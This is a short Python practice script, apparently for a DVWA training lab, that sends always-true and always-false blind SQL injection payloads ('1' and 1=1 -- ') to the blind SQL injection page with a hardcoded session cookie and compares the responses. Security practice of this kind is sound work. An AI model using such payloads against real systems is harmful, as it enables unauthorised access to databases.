import requests

URL = "https://f0012fbf98204f57ae3bbf2cb76c8bce--8080.ap-shanghai2.cloudstudio.club/vulnerabilities/sqli_blind/"

# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
# 重点：PHPSESSID只粘贴纯字符串，不要空格、换行、中文
# 从浏览器复制，粘贴到记事本，再复制一遍去除隐形字符
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
COOKIE = {
    "PHPSESSID": "ldi9n0nspgemlhdv38su5o9dt3",
    "security": "low"
}

# 永真、永假测试
payload_true = "1' and 1=1 -- "
payload_false = "1' and 1=2 -- "

try:
    r1 = requests.get(URL, params={"id": payload_true, "Submit":"Submit"}, cookies=COOKIE, timeout=20)
    r2 = requests.get(URL, params={"id": payload_false, "Submit":"Submit"}, cookies=COOKIE, timeout=20)

    print("永真页面包含exists：", "User ID exists" in r1.text)
    print("永假页面包含exists：", "User ID exists" in r2.text)

except Exception as e:
    print("异常：", e)
